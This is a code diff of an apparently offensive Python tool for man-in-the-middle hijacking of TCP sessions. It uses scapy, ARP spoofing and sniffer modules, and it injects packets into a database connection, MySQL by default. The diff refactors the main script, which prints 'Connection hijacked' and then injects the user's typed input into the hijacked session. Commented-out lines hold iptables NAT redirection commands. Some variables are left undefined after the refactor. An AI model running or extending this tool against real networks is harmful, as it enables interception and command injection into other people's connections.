@@ -2,6 +2,7 @@
 #import library ti handle command-line arguments
 import argparse
 #Library for a signal catching as interrupts (Ctrl+C)
+import importlib
 import signal
 #Library for time managment
 import time
@@ -11,31 +12,15 @@ import sys
 import os
 #Libraru for the REGEX
 import re
-from scapy.all import *
-from libs import injector, spoofing
-from libs import sniffer
-from libs import logger
-from libs import packet
+import scapy.all as scapy
+from libs import injector, spoofing,sniffer as sniff,logger,packet as lpkt
 
-# define our settings class for init our program
-class settings:
-    logger  = None
-    cmd_list= []
-    # var for our ip
-    ip      = ""
-    # Var for mac adress
-    mac     = ""
-    # Var for ip src in TCP packet 
-    src     = ""
-    # Var for ip dest in TCP packet
-    dst     = ""
-    # Var of the target port
-    port    = 0
+sniffer = None
 
 # define our main fonction
 def main():
-    # inmport global settings(get all Var)
-    global settings
+    # import global settings(get all Var)
+    global settings, log, ip, mac, sniffer
     print ("""
         █▐▒▒░░■·  ▀█▀    ▀█▀ ▀███   ▀██▀ mitm
         █      ■·  ▀▀▌   █▀   ████   ██
@@ -85,9 +70,8 @@ def main():
     parser.set_defaults(firewall=True)
     # parse command-line argument
     args = parser.parse_args()
-
-    if args.verbose != 0:
-        settings.logger = logger.init(args.verbose)
+    log = logger.log(args.verbose | 0)
+        
 
 #Regular expression for IP, MAC ant Port validation
     ip_reg = re.compile('^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)(\.(?!$)|$)){4}$')
@@ -118,32 +102,33 @@ def main():
         exit()
     
     # Set the global settings for SRC, DST, PORT and IFACE.
-    settings.src = args.src
-    settings.dst = args.dst
-    settings.port = port
-    settings.iface = args.iface
+    src = args.src
+    dst = args.dst
+    iface = args.iface
+    ip = ""
+    mac = ""
 
     #enabling firewall redirection.
-    if args.own is not None:
-        if len(args.own) != 0:
-            # Extract attackers own IP and MAC from the '--own' argument
-            settings.ip = args.own.split(":")[0]
-            settings.mac = args.own.split(":")[1]
+    #if args.own is not None:
+    #    if len(args.own) != 0:
+    #        # Extract attackers own IP and MAC from the '--own' argument
+    #        ip = args.own.split(":")[0]
+    #        mac = args.own.split(":")[1]
             # Validation of the attacker Mac address
-            if not mac_reg.match(settings.mac):
-                print("Invalid mac address!")
-                exit()
-            print("arp spoofing mac, sleeping 5seconds")
+    #        if not mac_reg.match(settings.mac):
+    #            print("Invalid mac address!")
+    #            exit()
+    #        print("arp spoofing mac, sleeping 5seconds")
 
     #Get the MAC adress of the listenning network interface 
-    mac = get_if_hwaddr(settings.iface)
+    mac = scapy.get_if_hwaddr(iface)
     # TODO: Delete this rule after program is running
     #print("trying:")
     #print("iptables -t nat -A POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
     #os.system("iptables -t nat -A POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
     #settings.cmd_list.append("iptables -D POSTROUTING -o "+settings.iface+" -s "+settings.src+" -p tcp --dport "+settings.port+" -j SNAT --to 127.0.0.1:"+settings.port)
     
-    if args.own is not None and len(settings.ip) == 0:
+    if args.own is not None and len(ip) == 0:
         True
         #print("trying:")
         #print("iptables -D POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
@@ -152,10 +137,13 @@ def main():
         #settings.cmd_list.append("iptables -t nat -A POSTROUTING -o "+settings.iface+" -j SNAT --to "+settings.ip)
         #spoofer.start(settings.ip, settings.src, settings.dst)
     
-    # initialize packet injection 
-    injector.init("mysql" if len(proto) == 0 else proto, settings.src, settings.dst, mac)
+    # initialize packet injection
+    proto_name = "mysql" if len(proto) == 0 else proto
+    log.print("protocol "+proto_name+" selected.")
+    proto = importlib.import_module("libs.proto."+proto_name).protocol(src, dst, mac)
+    log.print("protocol was started.")
     #Start the sniffing packets
-    sniffer.start(settings.src, settings.dst, port, settings.iface, mac, args.write)
+    sniffer = sniff.sniffer(src, dst, port, iface, proto_name, mac, args.write)
     #if sniffer.settings.injected is False:
     #    print("Failed to get a packet sample.")
     print("Connection hijacked, terminal:")
@@ -164,11 +152,11 @@ def main():
     while args.stdin:
         payload = sys.stdin.readline()
         ready = lpkt.psh(payload)
-        packet.send(ready)
+        lpkt.send(ready)
 
-# DEf the exit fonction on Ctrl+C
+# Def the exit fonction on Ctrl+C
 def on_exit(*_):
-    global settings
+    global sniffer
     print("Killing threads and exiting...")
     # Stop Sniffing
     sniffer.stop()
